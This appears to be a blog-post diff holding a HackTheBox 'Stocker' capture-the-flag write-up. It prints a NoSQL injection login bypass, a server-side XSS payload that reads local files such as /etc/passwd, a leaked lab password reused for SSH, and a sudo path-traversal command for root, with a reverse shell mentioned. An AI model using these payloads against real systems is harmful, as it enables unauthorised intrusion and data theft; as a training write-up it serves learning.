@@ -1,0 +1,142 @@
+---
+layout: post
+title:  "Writeup of Stocker (HackTheBox)"
+date:   2023-06-30 16:28:53 +0000
+categories: htb, hackthebox
+---
+
+# Discovery
+There isn't much on the main page **stocker.htb**, although there is one name:
+
+```
+Angoose Garden, Head of IT at Stockers Ltd.
+```
+
+It might be useful for bruteforcing credentials, or **Angoose** is a hint about **Mongoose**.
+
+`ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.stocker.htb" -u http://stocker.htb -fs 178`
+
+There is a subdomain **dev.stocker.htb**.
+
+It's some **Express** app with a login page.
+
+```
+X-Powered-By: Express
+```
+
+# Injection
+
+There is NoSQL injection in **dev.stocker.htb/login**
+
+```
+POST /login HTTP/1.1
+Host: dev.stocker.htb
+Content-Type: application/json
+
+{
+    "username": { "$ne": null },
+    "password": { "$ne": null }
+}
+```
+
+# API
+
+By first making a `POST /api/order` with:
+
+```json
+{
+  "basket": [
+    {
+      "_id": "638f116eeb060210cbd83a8f",
+      "title": "<script>document.body.append(window.location)</script>",
+      "description": "It's a rubbish bin.",
+      "image": "bin.jpg",
+      "price": 76,
+      "currentStock": 15,
+      "__v": 0,
+      "amount": 1
+    }
+  ]
+}
+```
+
+We get:
+
+```json
+{"success":true,"orderId":"648317f7f5c3637ed798f97c"}
+```
+
+Then `GET /api/po/648317f7f5c3637ed798f97c` (returned id):
+
+```
+file:///var/www/dev/pos/648317f7f5c3637ed798f97c.html
+```
+
+**It's [server-side XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)!**
+
+# Reading files
+
+**We can read local files using:**
+
+`<script>x=new XMLHttpRequest;x.onload=function(){document.body.innerHTML += btoa(this.responseText).replace(/(.{20})/g, '$1<br />')};x.open('GET','file:///etc/passwd');x.send();</script>`
+
+- /etc/passwd
+
+```
+root:x:0:0:root:/root:/bin/bash
+...
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
+angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
+```
+
+- /var/www/dev/index.js
+
+```
+const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
+```
+
+# SSH - angoose
+
+`ssh angoose@10.10.11.196`
+
+**angoose:IHeardPassphrasesArePrettySecure** works!
+
+```
+tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+```
+
+`sudo -l`
+
+```
+Matching Defaults entries for angoose on stocker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User angoose may run the following commands on stocker:
+    (ALL) /usr/bin/node /usr/local/scripts/*.js
+```
+
+`ls -la /usr/local/scripts`
+
+```
+-rwxr-x--x  1 root root  245 Dec  6  2022 creds.js
+-rwxr-x--x  1 root root 1625 Dec  6  2022 findAllOrders.js
+-rwxr-x--x  1 root root  793 Dec  6  2022 findUnshippedOrders.js
+drwxr-xr-x  2 root root 4096 Dec  6  2022 node_modules
+-rwxr-x--x  1 root root 1337 Dec  6  2022 profitThisMonth.js
+-rwxr-x--x  1 root root  623 Dec  6  2022 schema.js
+```
+
+# Root
+
+**RCE as root** - can execute any script by running:
+
+`sudo /usr/bin/node /usr/local/scripts/../../../tmp/script.js`
+
+By executing a reverse shell *(rev.js)* we get root.
+
+`root.txt: <redacted>`
